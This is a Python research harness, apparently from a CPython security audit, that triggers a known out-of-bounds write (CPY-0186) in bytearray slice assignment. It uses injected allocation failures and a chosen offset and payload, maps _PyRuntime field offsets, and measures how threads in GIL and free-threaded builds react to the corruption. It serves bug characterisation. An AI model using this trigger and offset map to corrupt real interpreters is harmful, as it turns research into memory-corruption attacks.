"""Task (e): does the free-threaded build widen CPY-0186's exposure?

CPY-0186 (uninitialized-dealloc-auditor U1) is an out-of-bounds WRITE whose
base pointer is `&_PyRuntime.static_objects.singletons.bytes_empty.ob_sval[0]`
and whose offset `lo` and payload are both Python-chosen
(Objects/bytearrayobject.c:586-605 -> :631).

`_PyRuntime` is one process-global shared by every thread and every
interpreter.  Measured sizes (nm -S):

    release-gil-nojit   346,472        debug-gil-nojit   362,496
    release-ft-nojit    406,016        debug-ft-nojit    424,448

and measured field offsets (gdb, debug builds):

                              debug-gil     debug-ft
    static_objects            30,224        30,224
      .singletons.bytes_empty 63,184        79,664
      sizeof(static_objects)  106,016       144,640
    _main_interpreter         136,240       174,912
      sizeof(PyInterpreterState) 226,256    249,536
      .stoptheworld (+offset) 10,784        10,816

`_main_interpreter` is the field immediately after `static_objects` and the
LAST field of `struct pyruntimestate`, so everything downstream of the write
base is interpreter state.

This script measures the part that is not arithmetic: whether other threads
running ordinary Python during the corruption crash, hang, or silently read
corrupted shared state -- and whether that differs between build families.

Usage:
    python gil_runtime_oob_ft_exposure.py <child|drive> ...
    drive:  gil_runtime_oob_ft_exposure.py drive <python> <lo> [n_lo n_hi]
"""

from __future__ import annotations

import subprocess
import sys

CHILD = r'''
import faulthandler, sys, threading, time
faulthandler.enable()
import _testcapi

SIZE, LO, BL, N = {size}, {lo}, {bl}, {n}
stop = threading.Event()
bad = []
started = threading.Barrier({nw} + 1)

def worker(k):
    started.wait()
    lock = threading.Lock()
    while not stop.is_set():
        # 1. the shared single-byte bytes singletons
        for i in (0, 1, 2, 3):
            if bytes([i]) != bytes((i,)):
                bad.append("singleton%d" % i)
        # 2. the shared interned strings (struct _Py_global_strings)
        d = {{"append": 1, "count": 2}}
        if d.get("append") != 1:
            bad.append("interned")
        # 3. a real lock acquire/release -- exercises interpreter mutex state
        with lock:
            pass
        # 4. allocation + attribute lookup
        _ = [].__class__.__name__

ws = [threading.Thread(target=worker, args=(k,), daemon=True) for k in range({nw})]
for t in ws:
    t.start()
started.wait()
time.sleep(0.15)

b = bytearray(b'x' * SIZE)
src = bytes(b'\xAA' * BL)
try:
    b[LO:SIZE] = src            # warm, unarmed
except MemoryError:
    pass
b = bytearray(b'x' * SIZE)

if N >= 0:
    _testcapi.set_nomemory(N, N + 1)
try:
    b[LO:SIZE] = src
    r = "no-exception"
except MemoryError:
    r = "MemoryError"
except BaseException as e:
    r = "%s: %s" % (type(e).__name__, e)
finally:
    try:
        _testcapi.remove_mem_hooks()
    except Exception:
        pass
print("OP:%s" % r); sys.stdout.flush()

# Let the workers observe the corrupted runtime for a while.
deadline = time.monotonic() + 1.5
while time.monotonic() < deadline:
    time.sleep(0.05)
stop.set()
joined = 0
for t in ws:
    t.join(1.0)
    if not t.is_alive():
        joined += 1
print("WORKERS:joined=%d/%d bad=%r" % (joined, {nw}, sorted(set(bad))[:6]))
sys.stdout.flush()
print("DONE")
'''


def main() -> None:
    if sys.argv[1] != "drive":
        raise SystemExit("use: drive <python> <lo> [n_lo n_hi]")
    python = sys.argv[2]
    lo = int(sys.argv[3])
    n_lo = int(sys.argv[4]) if len(sys.argv) > 4 else 0
    n_hi = int(sys.argv[5]) if len(sys.argv) > 5 else 8
    for n in range(n_lo, n_hi):
        src = CHILD.format(size=400_000, lo=lo, bl=4096, n=n, nw=4)
        try:
            p = subprocess.run(
                [python, "-c", src], capture_output=True, text=True, timeout=60
            )
            rc, out, err = p.returncode, p.stdout, p.stderr
        except subprocess.TimeoutExpired as e:
            rc = 124
            out = (e.stdout or b"").decode("utf-8", "replace") if isinstance(e.stdout, bytes) else (e.stdout or "")
            err = (e.stderr or b"").decode("utf-8", "replace") if isinstance(e.stderr, bytes) else (e.stderr or "")
        flat = " | ".join(x for x in out.splitlines() if x)
        san = "ASAN" if "Sanitizer" in err else ""
        interesting = rc != 0 or san or "bad=[]" not in flat or "DONE" not in flat
        if interesting:
            print(f"  lo={lo:<7d} n={n:<3d} rc={rc:<5d} {san:4s} {flat[:200]}")
            if err and (san or rc not in (0, 1)):
                for ln in err.strip().splitlines()[:6]:
                    print("        " + ln)


if __name__ == "__main__":
    main()
